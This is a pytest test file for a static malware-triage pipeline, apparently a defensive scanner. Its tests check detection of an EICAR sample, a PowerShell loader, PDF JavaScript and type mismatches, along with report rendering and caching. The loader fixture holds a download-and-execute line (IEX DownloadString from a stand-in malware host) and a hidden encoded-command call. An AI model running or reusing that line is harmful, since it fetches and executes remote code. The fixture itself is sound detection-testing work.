from __future__ import annotations

import errno
from pathlib import Path

import pytest

from maltriage.models import FileKind
from maltriage.pipeline import Pipeline, ScanOptions
from maltriage.safety import SafetyError

from .pe_builder import build_pe
from .sample_files import write_eicar

POWERSHELL_LOADER = b"""param($u)
$wc = New-Object Net.WebClient
IEX $wc.DownloadString('http://malware.example.com/stage2.ps1')
powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA
"""

PDF_JS = (
    b"%PDF-1.7\n"
    b"1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript "
    b"/JS (app.alert('x')) >> >> endobj\n"
    b"trailer << /Root 1 0 R >>\n%%EOF\n"
)


def test_eicar_matches_yara_rule(pipeline: Pipeline, tmp_path: Path):
    sample = write_eicar(tmp_path / "eicar.com")
    report = pipeline.scan(sample)
    assert report.file.kind is FileKind.TEXT
    assert report.file.sha256
    assert any(f.analyzer == "yara" for f in report.findings)
    assert report.verdict.score >= 20
    assert report.verdict.band in {"suspicious", "likely_malicious", "malicious"}


def test_powershell_loader_is_flagged(pipeline: Pipeline, tmp_path: Path):
    sample = tmp_path / "stage1.ps1"
    sample.write_bytes(POWERSHELL_LOADER)
    report = pipeline.scan(sample)

    assert report.file.kind is FileKind.SCRIPT
    analyzers = {f.analyzer for f in report.findings}
    assert "script_behavior" in analyzers
    assert report.verdict.score >= 20
    assert any(ioc.type.value == "url" for ioc in report.iocs)


def test_pdf_javascript_is_flagged(pipeline: Pipeline, tmp_path: Path):
    sample = tmp_path / "invoice.pdf"
    sample.write_bytes(PDF_JS)
    report = pipeline.scan(sample)

    assert report.file.kind is FileKind.PDF
    assert any(f.analyzer == "pdf_active" for f in report.findings)
    assert report.verdict.score >= 15


def test_clean_pe_scores_zero(pipeline: Pipeline, tmp_path: Path):
    sample = tmp_path / "hello.exe"
    sample.write_bytes(build_pe())
    report = pipeline.scan(sample)

    assert report.file.kind is FileKind.PE
    assert report.verdict.band == "clean"
    assert report.verdict.score == 0
    assert any(f.analyzer == "signature" for f in report.findings)


def test_extension_mismatch_detected(pipeline: Pipeline, tmp_path: Path):
    sample = tmp_path / "invoice.pdf.exe"
    sample.write_bytes(build_pe())
    report = pipeline.scan(sample)
    # ".exe" is a valid PE extension, so use a mismatched name instead
    sample2 = tmp_path / "photo.jpg"
    sample2.write_bytes(build_pe())
    report2 = pipeline.scan(sample2)
    assert any(f.signal == "type_mismatch" for f in report2.findings)
    assert report.file.kind is FileKind.PE


def test_reports_round_trip(pipeline: Pipeline, tmp_path: Path):
    from maltriage.reporters import available, get_renderer

    sample = write_eicar(tmp_path / "eicar.com")
    report = pipeline.scan(sample)

    for name in available():
        text = get_renderer(name).render(report, defang=True)
        assert text

    html = get_renderer("html").render(report, defang=True)
    assert "Static triage report" in html
    assert "eicar" in html.lower()

    markdown = get_renderer("markdown").render(report, defang=False)
    assert report.file.sha256 in markdown

    stix = get_renderer("stix").render(report)
    assert '"type": "bundle"' in stix


def test_cache_records_history(pipeline: Pipeline, tmp_path: Path):
    sample = write_eicar(tmp_path / "eicar.com")
    first = pipeline.scan(sample)
    second = pipeline.scan(sample)
    assert first.file.sha256 == second.file.sha256
    assert any(f.analyzer == "cache" for f in second.findings)
    stats = pipeline.cache.stats()
    assert stats["scans"] >= 2


def test_scan_options_disable_enrichment(pipeline: Pipeline, tmp_path: Path):
    sample = write_eicar(tmp_path / "eicar.com")
    report = pipeline.scan(sample, ScanOptions(enrich=False))
    assert report.enrichment == []


def test_unreadable_sample_is_a_clean_error(
    pipeline: Pipeline, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """A file the OS refuses to hand over must not crash the scan."""
    sample = tmp_path / "held.txt"
    sample.write_bytes(b"harmless")

    def blocked(self, *args, **kwargs):
        raise OSError(errno.EINVAL, "Invalid argument", str(self))

    monkeypatch.setattr(Path, "read_bytes", blocked)
    with pytest.raises(SafetyError, match="cannot read"):
        pipeline.scan(sample)
